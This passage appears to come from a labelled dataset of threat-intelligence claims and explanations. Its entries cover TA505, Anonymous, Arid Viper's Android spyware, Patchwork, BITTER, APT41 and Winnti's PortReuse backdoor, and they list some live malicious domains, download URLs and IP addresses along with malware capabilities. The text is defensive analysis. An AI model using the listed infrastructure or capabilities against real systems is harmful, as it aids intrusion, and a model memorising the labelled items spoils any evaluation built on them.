FIN7 and TA505 could in fact be working together. It seems that the FSI observed that an infection chain in line with those of TA505 deployed malware targeting POS terminals (PoS systems), belonging to FIN7. Despite the scale of its activity as an affiliate of Dridex and Locky, TA505 was only identified as such in 2017, at the same time as its first uses of backdoors. Often mistaken for the Evil Corp cybercriminal group (operating the Dridex botnet and BitPaymer ransomware), and sometimes considered to be the operator of the Necurs botnet, TA505 uses a scalable attack arsenal which it implements in varied and sometimes simultaneous campaigns, casting confusion over its motives. As such, the ties it has with Lazarus and Silence suggest that TA505 conducts parallel campaigns for its own behalf and campaigns for its clients. The scale of its campaigns since 2019 and its targeting of several sectors in France, make this intrusion set a threat of special concern in 2020.\n\n\n",

Let’s dive deep into the world of Anonymous, and read about the fascinating history of the hacker group that will be remembered for generations.Anonymous first appeared in 2004, on the 4chan message forum that had been created a year earlier. In the early days of the forum, many users would flood game chat rooms and other forums with what they called “Raids”. The traffic overload caused these chat rooms to shut down. This created the basis for what we know today as Anonymous- a movement of individuals gathering through secure chat rooms to plan and execute disruptive cyberattacks. At first, done as pranks for amusement, soon the group began to carry out ideology-driven attacks.The main philosophy of the hacker group Anonymous is opposition to governments and private organizations that work to promote inequality and censorship, according to the view of the group’s members. However, it is important to remember that because the group is decentralized and does not have a single leadership, there are no clear guidelines, and among the group members there are many debates on which causes to support. In a post published on Twitter in 2019, a member of the Anonymous group, who emphasized that he does not speak for the entire group, claimed that Anonymous is made up of working-class people who seek to create a better world for all of humanity and that its main principles are freedom of information, freedom of expression, privacy for citizens and holding companies and governments accountable for their actions.Although the group has carried out countless small and medium-sized cyber attacks, some of which are probably unknown to the world, we have collected a respectable list of the famous attacks that made them a household name in the world of hacktivism: 2008 – Attack on the Church of Scientology – Operation Chanology is the name given to a series of attacks on the famous church in January 2008. These attacks included disabling the church’s websites using DDOS, prank calls, and black faxes designed to use all the church’s ink. Although it might sound unimpressive and even a bit low-tech in 2022, in 2008 fax was still one of the main means of communication, and the attack cost the church not only its reputation but also a considerable financial cost. The Anonymous group posted a video on YouTube that takes responsibility for the attack, explaining that these attacks were done so that the church would stop the financial exploitation of its believers. Anonymous called on people to protest against the church, and in February thousands of people gathered in various centers in demonstrations against the church, some wearing mask for the movie “V for Vendetta” to protect their identity.2009- Protest against the falsification of the elections in Iran. In June 2009, presidential elections took place in Iran, in which, not surprisingly, Mahmoud Ahmadinejad won. Allegations of fraud in the elections led the Anonymous group along with The Pirate Bay to create an opposition website to the Iranian regime that attracted tens of thousands of visitors and allowed the free transfer of information in the censored country. 2010- Operations Payback- The giant conglomerate Sony caught the attention of Anonymous after it became known that Sony is suing individuals who created software that allows users to run PlayStation 3 on Linux. Anonymous responded by shutting down Sony’s website, harassing employees, and creating disruptions in the corporate network. 2010 – Support for the WIKILEAKS site – In February 2010, the site used by whistleblowers to publish classified and stolen documents was under pressure from many parties to stop its operations. Anonymous announced their full support for WIKILEAKS and began DDOS attacks on Mastercard, Visa, PayPal, Amazon, and SWISS Bank in response to actions seen as anti-WIKILEAKS, such as stopping the possibility of donating to the site. After the founder of the site was arrested in London, Anonymous disabled the website of the Swiss Ministry of Justice because they demanded that England hand over the detainee. The website of the Zimbabwean government was also taken down by hackers because they censored the site.2011- The Arab Spring. Many countries that took part in the Arab Spring became a target in the hands of the hacker group that supported the protesters, including countries such as Tunisia, Egypt, Bahrain, Libya, Jordan, and Morocco. 2011- In June, Anonymous attacked over 90 Indonesian government websites in response to the blocking of WikiLeaks and The Pirate Bay. 2011 – Anonymous announced that in response to the Stuxnet virus created by the United States and Israel designed to target the Iranian nuclear program, Anonymous would attack the Knesset website and disable it. 2012 – Megaupload website that provided file-sharing services were shut down by the United States Department of Justice and the FBI, which led to an attack by Anonymous on the US government, taking down the Department of Justice website. The attack included, among other things, the use of new and sophisticated attack methods, in which various Internet users who clicked on links in chat rooms and on Twitter actually participated, even without their knowledge, in denial of service attacks. 2013 – Opisrael – Planned for Holocaust memorial Day – April 7, 2013. The website of the “Bigger Than Life” organization, which accompanies families whose children are diagnosed with cancer, was attacked and its home page was vandalized with antisemitic and anti-Israel messages. Other sites such as Yad Vashem, the Ministry of Defense, the Election Commission, and the Ministry of Foreign Affairs were shut down for several hours. The attack was also accompanied by false reports published by the hackers, including damages worth 5$ billion allegedly caused. 2014- Support for Hong Kong’s independence- Following the riots in Hong Kong, the people’s demand for independence, and the violent response of the Chinese government to suppress the riots, Anonymous declared support for the protesters and began attacks on private companies in Hong Kong that support the Chinese regime. 2015- Anonymous declared that it is against the terrorist organization ISIS after the terrorist attack in Paris 2022- Anonymous made headlines for a string of successful attacks against Russia as part of its support for Ukraine, leaking documents and information about senior military personnel. Blocking websites of individual organizations Those who continue to do business with Russia, shutting down government websites of Russia and Belarus, bypassing censorship in Russia and publishing photos from the war, and training other activists who will fight for Ukraine.\n\n\n",

        "claim": "Arid Viper disguising mobile spyware as updates for non-malicious Android applications.",
        "original_label": "true",
        "label": "true",
        "explain": "Since April 2022, Cisco Talos has been tracking a malicious campaign operated by the espionage-motivated Arid Viper advanced persistent threat (APT) group targeting Arabic-speaking Android users. In this campaign, the actors leverage custom mobile malware, also known as Android Package files (APKs), to collect sensitive information from targets and deploy additional malware onto infected devices.Although Arid Viper is believed to be based out of Gaza, Cisco Talos has no evidence indicating or refuting that this campaign is related in any way to the Israel-Hamas war. Furthermore, the publication of this research was delayed while Talos was performing the due diligence with law enforcement.The mobile malware used in this campaign shares similarities with a non-malicious online dating application, referred to as Skipped. The malware specifically uses a similar name and the same shared project on the applications’ development platform. This overlap suggests the Arid Viper operators are either linked to Skipped’s developer or somehow gained illicit access to the shared project’s database. Our analysis uncovered an array of simulated dating applications that are linked to Skipped, leading us to assess that Arid Viper operators may seek to leverage these additional applications in future malicious campaigns.In order to coerce users into downloading their mobile malware, Arid Viper operators share malicious links masquerading as updates to the dating applications, that instead deliver malware to the user’s device.Arid Viper’s Android malware has a number of features that enable the operators to disable security notifications, collect users’ sensitive information, and deploy additional malicious applications on the compromised device.The mobile malware deployed by Arid Viper in this campaign shares similarities with the non-malicious dating application Skipped, in that it has a similar name and uses the same shared project on the application development platform Firebase. These overlaps, explained in further detail below, suggest the Arid Viper operators may be linked to Skipped’s developers, and/or they may have illicitly copied characteristics of the non-malicious application in order to entice and deceive users into downloading their malware. Of note, the technique of leveraging legitimate application names in order to coerce users into downloading malicious software is in line with the “honey trap” tactics used by Arid Viper in the past. The name of Arid Viper’s mobile malware, “Skipped_Messenger,” appears to be a reference to Skipped, which is listed on some application stores as “Skipped - Chat, Match & Dating.” The “Skipped_Messenger” malware uses Google’s Firebase messaging system as a command and control (C2) channel, while the non-malicious Skipped application uses it for pushing out notifications. Google’s Firebase messaging system works via the creation of a named project, along with other unique identifiers. This project is protected with a set of credentials and API keys. In order for developers to write applications that use the same project and Firebase databases, they need credentials in the form of API keys, and project and application IDs that are generated in the Firebase project’s console. The Android malware deployed in this malicious campaign extensively uses the same Firebase databases used by Skipped, however, both the malware and the non-malicious application use their own set of distinct credentials, including API keys and Client Application IDs. This observation indicates that the malware developers had access to the same Firebase project and backend database that are used by the non-malicious dating application, and generated their own set of credentials. Talos also considered, though assessed it was unlikely, that Skipped’s Firebase databases were configured in test mode, made publicly available, and abused by Arid Viper. Test mode allows a developer to quickly set up a database for testing purposes, which makes it available to everyone who knows the URL. This mode needs to be set when the database is first created and is only available for 30 days. After this duration, the database is locked and needs to be specifically re-configured to provide public access. The passive DNS data for the Skipped Firebase project’s domain shows that the URL for the database was first seen on August 9, 2021, while Arid Viper’s malware started using this infrastructure beginning on November 11, 2022. Given the malware used Skipped’s Firebase project almost a year after the infrastructure was set up (and well outside the 30 day window of public access), it is unlikely Arid Viper leveraged unintentional public access to the database. Furthermore, this mode does not provide any management capabilities for the overall Firebase project, but rather only provides data read and write capabilities to the backend database. The generation of API keys and registration of the Android malware for the project would still need to be provisioned on the project’s management console. Finally, Talos found no public evidence of the Firebase/Google Cloud project being compromised such that it may be used by any parties except the project’s original creators. This supports our assessment that Skipped developers likely shared their Firebase project with Arid Viper operators. As seen below, the malware used by Arid Viper in this campaign is very similar to remote access trojans (RATs) used by the threat actor in previous campaigns. The previous versions of the malware all allude to the Skipped application, either via references in Android package names or in the malware’s Graphical User Interface (GUI).Our analysis uncovered an extended web of companies that create dating-themed applications that are similar or identical to Skipped. Given the aforementioned connections between Arid Viper’s mobile malware and Skipped, we assess that Arid Viper operators may seek to leverage the infrastructure and/or names of these additional applications in future malicious campaigns. The publisher of Skipped, a company called “Skipped GmbH,” was registered and is headquartered in Germany, and appears to be linked to a multitude of seemingly non-malicious dating applications published by companies in Singapore and Dubai. We found that the domains used by these additional companies to distribute their dating applications, which are available on the Google and Apple application stores, were registered by Skipped GmbH. Most of these applications provide their users with a chatting service, where no face-to-face interaction is possible. During these conversations, the application will interrupt and request the user buys “coins” in order to continue the interaction. This feature is notable as, if there is a current or potential connection between Arid Viper and these applications, it could generate revenue for the APT operators. The following online dating applications that are connected to Skipped GmbH can be installed from the Google Play Store or the Apple App Store:We were able to connect Skipped GmbH, the central entity in this ecosystem, to individual(s) operating under multiple monikers. Pivoting off the individual(s) we were able to identify at least three different yet related companies in Germany that author and distribute mobile applications that are usually dating-themed:These applications are distributed over both Apple and Google’s application stores and use German in their advertisements and content. All of these applications contain romance or dating themes, a common characteristic of applications abused by the Arid Viper group in the past. Talos discovered multiple domains registered by Skipped GmbH that serve as product home pages and host artifacts like application service agreements. The applications that these domains pertain to are all romance and dating themed and are distributed on the App Stores using a variety of publisher entities. A high-level timeline of events for the companies, domains and applications involved in this ecosystem is shown below: All websites listed above use the exact same template to present their content, with minor variations in the content itself, captions and images. The websites provide links to download the application from application stores in the website footer. The legal agreement and publisher information on these sites, however, may not refer to Skipped GmbH. In fact, many of the websites list companies based out of different countries:Although there is a concrete connection between Skipped GmbH and the domains associated with these applications as evidenced by their domain registration information, it is currently unclear if there is a direct relationship between Skipped GmbH and the other developers listed above that distribute these applications. Talos produced a graph to map the connections between the application companies, domains, and websites, which can be seen below. This graph includes a connection to Arid Viper’s Android malware based on the malware’s overlapping use of Firebase with Skipped, as explained above. At the center of the graph lies Skipped GmbH, which is used for registering domains and establishing websites for the various dating applications. These applications and their websites are connected to additional developers and publishers located globally. For example, the “Joula” application is distributed by a company called “NYUTAINMENT PTE. LTD”, based out of Singapore. However, the domain for Joula, joula[.]app was registered by Skipped GmbH. Notably, although this ecosystem of applications and publishers cannot be explicitly categorized as a scam operation, at least one of these companies, NYUTAINMENT PTE. LTD, was issued Cease and Desist orders in January 2022 by the Berlin Regional Court for operating websites and applications using fake profiles.Arid Viper’s latest campaign, which Talos observed occurring since at least April 2022, targets Arabic-speaking Android users through mobile malware that masquerades as application updates. Arid Viper has a history of disguising their malware as updates, either for dating applications or for popular messaging applications such as WhatsApp, Signal, or Telegram. The attackers typically send targets a link to a tutorial video for the application, which is posted on a media-sharing website like YouTube. The tutorial video will provide a step-by-step account of all features of the application and instructions on how to operate it in Arabic, suggesting a specific targeting of Arabic-speaking individuals. One such video depicts an individual narrating in Arabic in Levantine dialect. A URL is provided in the video’s description, which directs to an attacker-controlled domain that serves a copy of Arid Viper’s APK malware. Talos identified a YouTube account that hosted such a video. The account was created on March 17, 2022 and has uploaded only one video, suggesting Arid Viper may use such accounts to host a limited number of videos at a time. The video, as shown in the screen capture above, had approximately 50 views at the time of writing. We assess that all the domains used by the attackers in this campaign are solely registered, operated and controlled by Arid Viper. These domains follow the same naming schema observed in previous Arid Viper infrastructure and are not only used to host malicious APKs, but also act as C2 servers for the implants. The domains are typically administered by the attackers by using webshells such as “ALFA TEaM Shell”.As previously mentioned, some of the malware deployed in this campaign used Google’s Firebase platform as C2 infrastructure for the malicious applications. The Firebase platform primarily serves as a C2 channel to issue commands and to download and upload files. The platform also has the ability to provide a new C2 server address to the malware so that it can switch fr,m the Firebase platform to another attacker-controlled C2 host. One of the Firebase projects used by Arid Viper in this campaign dates back to 2021 and has some non-malicious mobile APKs associated with it, indicating operators have been trying to create, test and popularize other APK software out of the same account for years. Arid Viper’s Android malware has a number of features that enable the operators to surreptitiously collect sensitive information from victims’ devices and deploy additional executables. The malware uses native code to hide some of its activities, meaning it can leverage Android’s capability that allows for the execution of assembly-based shared libraries. Android applications can usually be built from Java code, however, for performance reasons, applications have the ability to load libraries which are compiled into native code (shared libraries). This native code is also harder to analyze and reverse engineer. Once deployed, the malware attempts to hide itself on a victim machine by disabling system or security notifications from the operating system. The malware completely disables notifications on Samsung mobile devices and on any device with an Android package that contains the word “security”. The malware makes notifications less visible on Huawei, Google, Oppo and Xiaomi mobile devices. This malware loads a library typically called “libuoil.so” or “libdalia.so”, which exports four main functions. Each of these functions will return the name of an administration package installed by vendors on their version of the Android Open Source Project (AOSP). These names will then be used to hide notifications from the security packages from the four vendors mentioned above. It is unclear why these vendors require a different obfuscation procedure since the code strings are not obfuscated in the native code library. Arid Viper has been using native code libraries since at least 2021 with the intent of obfuscating C2 hostnames. However, in this campaign, the strings are not obfuscated at all and are used just to nullify the notifications from built-in security packages, a notable development in the way in which the threat actor is developing and packaging their Android malware. The malware is configured to obtain a number of permissions from the infected device, including the ability to:From the capability point of view, this RAT exhibits all the classic functionalities of an Android-based RAT including system fingerprinting, data exfiltration and payload deployment, to name a few.The malware has the capability to download additional malware, which is typically masquerading as updates for legitimate applications. It can also display notifications that specific applications have updates available, potentially prompting users to install the malicious updates. The malware has the capability to download, rename, and run the following applications:The implant has the ability to get system information from locations such as “/proc/cpuinfo“, and from systems services such as “activity”. It will also get memory information from the device using the StatFs API which is a wrapper for statvfs() Unix call.The implant has the ability to record telephone calls made on the compromised device. This is done by recording the MIC audio source, capturing the recording to a specified location on disk, and subsequently uploading all files in the directory to the C2 server.The malware can also capture SMS messages received by the device, send new SMS messages, and make calls to phone numbers specified by the C2:Finally, the implant records the following information for all SMS messages stored on the compromised device:The malware can record contact information from the device and save it in a file in a folder specified by the implant:The implant has the ability to record the call history information on the compromised device and save it in a specific file and folder. This information can include: Finally, Arid Viper’s malware has the ability to copy all files with the following extensions in a specified directory to another directory for exfiltration to C2: jpg, jpeg, png, pdf, doc, docx, ppt, pptx, xls, mpp, accdb, xlsx, mdb。 Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post.

Indeed, this is the first time we have observed Patchwork targeting molecular medicine and biological science researchers.",

        "explain": "Patchwork is an Indian threat actor that has been active since December 2015 and usually targets Pakistan via spear phishing attacks. In its most recent campaign from late November to early December 2021, Patchwork has used malicious RTF files to drop a variant of the BADNEWS (Ragnatela)Remote Administration Trojan (RAT). What is interesting among victims of this latest campaign, is that the actor has for the first time targeted several faculty members whose research focus is on molecular medicine and biological science. Instead of focusing entirely on victimology, we decided to shade some light on this APT. Ironically, all the information we gathered was possible thanks to the threat actor infecting themselves with their own RAT, resulting in captured keystrokes and screenshots of their own computer and virtual machines.We identified what we believe is a new variant of the BADNEWS RAT called Ragnatela being distributed via spear phishing emails to targets of interest in Pakistan. Ragnatela, which means spider web in Italian, is also the project name and panel used by Patchwork APT. Ragnatela RATwas built sometime in late November as seen in its Program Database (PDB) path “E:\\new_ops\\jlitest __change_ops -29no – Copy\\Release\\jlitest.pdb”. It features the following capabilities: In order to distribute the RAT onto victims, Patchwork lures them with documents impersonating Pakistani authorities. For example, a document called EOIForm.rtf was uploaded by the threat actor onto their own server at karachidha[.]org/docs/. That file contains an exploit (Microsoft Equation Editor) which is meant to compromise the victim’s computer and execute the final payload (RAT).That payload is stored within the RTF document as an OLE object. We can deduce the file was created on December 9 2021 based on the source path information.Ragnatela RAT communicates with the attacker’s infrastructure via a server located at bgre.kozow[.]com. Prior to launching this campaign (in late November), the threat actor tested that their server was up and running properly. The RAT (jli.dll) was also tested in late November before its final compilation on 2021-12-09, along with MicroScMgmt.exe used to side-load it.Another – unintentional – victim is the threat actor himself which appears to have infected is own development machine with the RAT. We can see them running both VirtualBox and VMware to do web development and testing. Their main host has dual keyboard layouts (English and Indian). Other information that can be obtained is that the weather at the time was cloudy with 19 degrees and that they haven’t updated their Java yet. On a more serious note, the threat actor uses VPN Secure and CyberGhost to mask their IPaddress. Under the VPN they log into their victim’s email and other accounts stolen by the RAT.This blog gave an overview of the latest campaign from the Patchwork APT. While they continue to use the same lures and RAT, the group has shown interest in a new kind of target. Indeed this is the first time we have observed Patchwork targeting molecular medicine and biological science researchers. Thanks to data captured by the threat actor’s own malware, we were able to get a better understanding about who sits behind the keyboard. The group makes use of virtual machines and VPNs to both develop, push updates and check on their victims. Patchwork, like some other East Asian APTs is not as sophisticated as their Russian and North Korean counterparts.\n\n\n",

Targets included individuals, as well as diplomatic and research organisations.”The campaign is characterised by the use of a novel modular framework codenamed CloudWizard, which features capabilities to take screenshots, record microphone, log keystrokes, grab passwords, and harvest Gmail inboxes.Bad Magic was first report in March 2023, detailing the group's use of a backdoor called PowerMagic (aka DBoxShell or GraphShell) and a modular framework dubbed CommonMagic in attacks targeting Russian-occupied territories of Ukraine.\n\n\n",

        "explain": "BITTER, an APT group which has been active since 2015, has been observed ramping up their activity lately. In this post, I will review recent infrastructure that is actively being used by this APT, which is suspected of being used to carry out attacks against Pakistani organizations.The BITTER APT group has notably been observed targeting Chinese and Pakistani interests in the past, and is suspected of being belonging to a country in South Asia. Recent reports from QiAnXin Technology’s “RedDrip” team, a Chinese security vendor, suggest that the BITTER APT group is actively launching attacks targeting Pakistani organizations. According to this , they are seeing malicious documents causing users to download payloads from maq.com.pk/wehs, which looks to be ArtraDownloader. ArtraDownloader is a Trojan Downloader that was discovered by PaloAlto’s UNIT42, and has also been observed downloading BitterRAT Remote Access Trojan, both of which have been associated with BITTER APT groups operations. Researching for activity related to ArtraDownloader on App.Any.Run reveals numerous examples of malicious Microsoft Word documents exploiting the CVE-2017-11882 vulnerability to download an executable payload from the aforementioned URL identified by RedDrip (maq.com.pk). CVE-2017-11882, which was patched by Microsoft in November of 2017, is a memory corruption vulnerability which grants the attacker RCE (remote code execution) upon the user opening a specially crafted file (see here for the Microsoft advisory). These Any.Run analyses indicate that, after exploitation and download of the ArtraDownloader from maq.com.pk, there is Command & Control activity beaconing to the URL onlinejohnline99.org/kvs06v.php. Pivoting off of Any.Run and into VirusTotal we can see that onlinejohnline99.org appears to be the Command & Control for several binaries, which are actively being distributed from several undiscovered domains. We already know about maq.com.pk, however because of VirusTotal’s relational graphing abilities, we are able to see that these binaries are also being served from biocons.pk, gandharaart.org, and sartetextile.com. One thing of interest, however notable, is all of the domains delivering these binaries are hosted by the same ISP (COMSATS, a Pakistani ISP). Digging deeper into the IP addresses hosting these domains (203.124.44.31, 203.124.44.66, 203.124.44.93, and 203.124.43.227) revealed that they were only hosting a very limited amount of domains, many of which appeared to be very suspect in naming convention or content. While these were suspicious, I could not directly relate them to BITTER APT activity at this time.Analysis of the discovered binaries confirm them to be ArtraDownloader samples, with variations in naming and hash values (such as intelx.exe, lsasw.exe, advrt.exe, wehs.exe, reportstableregular.doc.exe, and more). I won’t go into details surrounding the actual analysis of the malware samples as PaloAlto’s UNIT42 has already gone over this at length in their article found here and the binaries I reviewed do not appear to differ significantly from what was described in their write-up. All of the samples I reviewed utilized onlinejohnline99.org as their primary Command & Control infrastructure, with the exception of one sample which instead beaconed to the domain advas.zhongwenchuantongqiye.com, which was documented as being related to BITTER operations targeting the Chinese government in May of 2019 by 360-CERT. The Command & Control communications are typical for what we would see from ArtraDownloader, with all of the samples performing HTTP POST requests to their respective Command & Control domains with differing .php URI structures. Various strings within these samples are obfuscated by adding or subtracting from each byte within a string, and the data being POST’d to these C2 servers is no exception. In order to decode this data, you can use the following Python script provided by UNIT42 in their analysis of the downloader. Once you have deobfuscated the data, you’ll quickly see that it contains the typical identifying information that is obtained during initial infections, such as hostname, Windows version, username, unique identifier, and a Boolean value indicating if the second stage payload was downloaded and executed successfully.During my analysis, I was unable to obtain a second stage payload to further examine the BITTER APT infrastructure. However the additional payload would likely have been the BitterRAT Remote Access Trojan, which is routinely distributed by ArtraDownloader variants. Once installed, the BITTER actors could then pivot and perform various other action on objectives. At this time, the motives of this group is unknown, however it is likely that this campaign is in pursuit of some form of espionage due to the reports of them being backed by a south Asian country (some reports indicate India). Based on much of the infrastructure observed being hosted in Pakistan, I would agree with the initial suspicion that Pakistan is being targeted in these attacks. This would also further reaffirm the possible Indian attribution to BITTER APT, due to the long-running unrest regarding the Kashmir territorial conflict between India and Pakistan over the Kashmir region.\n\n\n",

        "explain": "Today, FireEye Intelligence is releasing a comprehensive report detailing APT41, a prolific Chinese cyber threat group that carries out state-sponsored espionage activity in parallel with financially motivated operations. APT41 is unique among tracked China-based actors in that it leverages non-public malware typically reserved for espionage campaigns in what appears to be activity for personal gain. Explicit financially-motivated targeting is unusual among Chinese state-sponsored threat groups, and evidence suggests APT41 has conducted simultaneous cyber crime and cyber espionage operations from 2014 onward. The full published report covers historical and ongoing activity attributed to APT41, the evolution of the group’s tactics, techniques, and procedures (TTPs), information on the individual actors, an overview of their malware toolset, and how these identifiers overlap with other known Chinese espionage operators. APT41 partially coincides with public reporting on groups including BARIUM (Microsoft) and Winnti (Kaspersky, ESET, Clearsky). Like other Chinese espionage operators, APT41 espionage targeting has generally aligned with China's Five-Year economic development plans. The group has established and maintained strategic access to organizations in the healthcare, high-tech, and telecommunications sectors. APT41 operations against higher education, travel services, and news/media firms provide some indication that the group also tracks individuals and conducts surveillance. For example, the group has repeatedly targeted call record information at telecom companies. In another instance, APT41 targeted a hotel’s reservation systems ahead of Chinese officials staying there, suggesting the group was tasked to reconnoiter the facility for security reasons. The group’s financially motivated activity has primarily focused on the video game industry, where APT41 has manipulated virtual currencies and even attempted to deploy ransomware. The group is adept at moving laterally within targeted networks, including pivoting between Windows and Linux systems, until it can access game production environments. From there, the group steals source code as well as digital certificates which are then used to sign malware. More importantly, APT41 is known to use its access to production environments to inject malicious code into legitimate files which are later distributed to victim organizations. These supply chain compromise tactics have also been characteristic of APT41’s best known and most recent espionage campaigns. Interestingly, despite the significant effort required to execute supply chain compromises and the large number of affected organizations, APT41 limits the deployment of follow-on malware to specific victim systems by matching against individual system identifiers. These multi-stage operations restrict malware delivery only to intended victims and significantly obfuscate the intended targets. In contrast, a typical spear-phishing campaign’s desired targeting can be discerned based on recipients' email addresses. A breakdown of industries directly targeted by APT41 over time can be found in Figure 1. Two identified personas using the monikers “Zhang Xuguang” and “Wolfzhi” linked to APT41 operations have also been identified in Chinese-language forums. These individuals advertised their skills and services and indicated that they could be hired. Zhang listed his online hours as 4:00pm to 6:00am, similar to APT41 operational times against online gaming targets and suggesting that he is moonlighting. Mapping the group’s activities since 2012 (Figure 2) also provides some indication that APT41 primarily conducts financially motivated operations outside of their normal day jobs. Attribution to these individuals is backed by identified persona information, their previous work and apparent expertise in programming skills, and their targeting of Chinese market-specific online games. The latter is especially notable because APT41 has repeatedly returned to targeting the video game industry and we believe these activities were formative in the group’s later espionage operations. APT41 leverages an arsenal of over 46 different malware families and tools to accomplish their missions, including publicly available utilities, malware shared with other Chinese espionage operations, and tools unique to the group. The group often relies on spear-phishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims. Once in a victim organization, APT41 can leverage more sophisticated TTPs and deploy additional malware. For example, in a campaign running almost a year, APT41 compromised hundreds of systems and used close to 150 unique pieces of malware including backdoors, credential stealers, keyloggers, and rootkits. APT41 has also deployed rootkits and Master Boot Record (MBR) bootkits on a limited basis to hide their malware and maintain persistence on select victim systems. The use of bootkits in particular adds an extra layer of stealth because the code is executed prior to the operating system initializing. The limited use of these tools by APT41 suggests the group reserves more advanced TTPs and malware only for high-value targets. APT41 quickly identifies and compromises intermediary systems that provide access to otherwise segmented parts of an organization’s network. In one case, the group compromised hundreds of systems across multiple network segments and several geographic regions in as little as two weeks. The group is also highly agile and persistent, responding quickly to changes in victim environments and incident responder activity. Hours after a victimized organization made changes to thwart APT41, for example, the group compiled a new version of a backdoor using a freshly registered command-and-control domain and compromised several systems across multiple geographic regions. In a different instance, APT41 sent spear-phishing emails to multiple HR employees three days after an intrusion had been remediated and systems were brought back online. Within hours of a user opening a malicious attachment sent by APT41, the group had regained a foothold within the organization's servers across multiple geographic regions. APT41 is a creative, skilled, and well-resourced adversary, as highlighted by the operation’s distinct use of supply chain compromises to target select individuals, consistent signing of malware using compromised digital certificates, and deployment of bootkits (which is rare among Chinese APT groups). Like other Chinese espionage operators, APT41 appears to have moved toward strategic intelligence collection and establishing access and away from direct intellectual property theft since 2015. This shift, however, has not affected the group's consistent interest in targeting the video game industry for financially motivated reasons. The group's capabilities and targeting have both broadened over time, signaling the potential for additional supply chain compromises affecting a variety of victims in additional verticals. APT41's links to both underground marketplaces and state-sponsored activity may indicate the group enjoys protections that enables it to conduct its own for-profit activities, or authorities are willing to overlook them. It is also possible that APT41 has simply evaded scrutiny from Chinese authorities. Regardless, these operations underscore a blurred line between state power and crime that lies at the heart of threat ecosystems and is exemplified by APT41.\n\n\n",

        "explain": "It seems the past few years have shown an increase in supply-chain attacks to distribute malware. Is this a reality, or because the industry is getting better at detecting and documenting them? Regardless of the answer, one of the groups that has been shown to be quite effective at conducting supply-chain attacks is the Winnti Group. Not only they have compromised multiple high-profile targets, but in each case, they were able to stay under the radar for many months before they were found and disrupted. This report describes in detail some of the new malware used by this group in the organizations they target. Another one of their backdoors, ShadowPad, was also updated recently. This report will also expose the new techniques they use to hide their payloads. By analyzing their tools and techniques, ESET researchers were able to infer some relationships between each reported supply-chain incident.When reading the multiple reports on the Winnti Group activities, it is sometime difficult to realize that some discuss about the same malware family or component. This report tries to use existing names as much as possible, by using the name as it was first reported. We understand that some of the names are different due to the naming schemes used by different vendors or the fact that the visibility during research couldn’t allow mapping an analysis to a specific existing name. There is also the problem of tools versus the name of the operation, which sometimes bear the same name. It is worth spending some time to define the terms we are going to use. There are currently two open court cases in the US against the alleged perpetrator behind this group. The first one, dated October 26th 2017, not long after the NetSarang incident, is a civil case filed by Microsoft. Without going into attribution, it describes how the ShadowPad malware operates and how it uses legitimate web sites to store the address of its C&C server. The second one has more details about attribution. The indictment was filed by US federal attorneys, in the District Court of Southern California, in October 2018. It accuses ten Chinese individuals of compromising companies mostly in the aerospace and technology industry. According to the indictment, the intentions were to steal intellectual property from the victims. The incidents they describe go from 2010 to 2015, where they used the Sakula, PlugX, and Winnti malware in the different organizations. Some of their attacks involved compromising the DNS registrar to change the nameservers of their target. We cannot be certain that the same individuals are behind the supply-chain attacks, but given that they were using the same toolset, they probably belong to the same organization.This shows that the group may have lot of different intents. For example, there is no explanation we can think of to target the gaming industry to perform espionage operations. This is one of the reasons ESET researchers and researchers for other vendors tend to agree that the Winnti Group may not be monolithic; it is plausible that there are multiple subgroups and that operations are not conducted by the same group that is authoring the malware they use. Based on ESET’s telemetry and public reporting, it seems they focus their efforts to compromise private organizations in Asia, with South Korea being one of the most targeted countries. During the course of our research, we were able to find different malware artifacts using the same techniques or code. To better visualize the full picture, we have created a diagram showing the relationships between all of them.Some of the components shown in this graphic have already been documented before. This report will dig into the new or updated ones. It will also describe techniques that are used and are important because they allow to link several incidents together. In our previous research [1] on the Winnti Group, we discussed a custom packer used in payloads embedded in compromised videogames and gaming application. It uses a unique structure seen in Figure 1 to embed a PE file. In addition to an RC4 key and the encrypted PE, this structure contains encrypted metadata such as path to the embedded PE file and a launch type value. The packer’s configuration structure is shown in Figure 2.The RC4 key (which is XOR-ed with 0x37) contained in the structure is used to decrypt the PE as well as the encrypted file name and path. The launch type value can be either 1 or 2 and indicates to the unpack-ing code, to be able to load it properly, whether the PE is an executable or a DLL. It’s interesting to note that the RC4 key contains only digits. It is also worth noting that there are 32- and 64-bits versions of this packer. Examples of the packer’s configuration found in video-games and gaming apps discussed in our previous blogpost [1] are shown in Table 1.After analyzing the custom packer used by the Winnti Group, we started hunting for more executable files with this packer, in the hope of unearthing other compromised software used in supply-chain attacks. What we’ve found is not exactly what we were looking for to begin with. Instead of finding compromised software, we discovered a new listening-mode modular backdoor that uses the same packer. We believe its author call it PortReuse. This is not a random name: this backdoor injects into a running process already listening on a TCP port, “reusing” an already open port. It hooks the receiving function and waits for a “magic” packet to trigger the malicious behavior. The legitimate traffic is forwarded to the real application, so it is effectively not blocking any legitimate activity on the compromised server. This type of backdoor is sometimes called a passive network implant. As we mentioned, this backdoor is using the same packing structure as the one used in 2018. It’s actually using it in a recursive way: packed components also contain packed components. The metadata of the packed PE files are actually interesting here: the file name field contains meaningful values and even absolute paths in some cases. In this report, we will be describing each component using the names the malware authors have given to these components.The PortReuse backdoor exhibits a modular architecture, since all its components are separate processes communicating through named pipes, as shown in Figure 3. This allows reusing existing binary components and replacing only the components that need customization. For instance, we have seen multiple PortReuse variants with a different NetAgent but using the same SK3. ProcTran and UserFunction exist in 32- and 64-bits versions but can communicate with any SK3 regardless of its version, since they share a common protocol through the named pipe.There is no C&C server in the backdoor. We have only seen NetAgent listening on open sockets. The attacker needs to connect directly to the compromised host. Only a single file is written to disk to start PortReuse. All other components exist in memory only. The initial launch file was found in different formats:InnerLoader is the first component to be decrypted and launched. As InnerLoader.dll is found packed with the custom packer, we were able to extract the packer metadata. The metadata from the packer, including absolute file path when it was packed, is shown in Table 2.As shown in the absolute file path, the name of the project from which InnerLoader belongs is called PortReuse. InnerLoader will look for a given process to inject two payloads. In the case of the .NET injector, InnerLoader targets a process called GameServer_NewPoker.exe and in the case of the VBS injector it will look for a process listening on port 53 (DNS). These payloads are, again, packed using the same packer and are called NetAgent and SK3 according the packer configuration. These packer configurations are shown in Table 3. NetAgent is the module responsible for handling TCP hooking. Depending on the NetAgent version, two different hooking techniques are used. NetAgent will hook either WSARecv or NtDeviceIoControlFile. In both cases, the hook will first check if the received packet complies to a given magic packet format as already seen 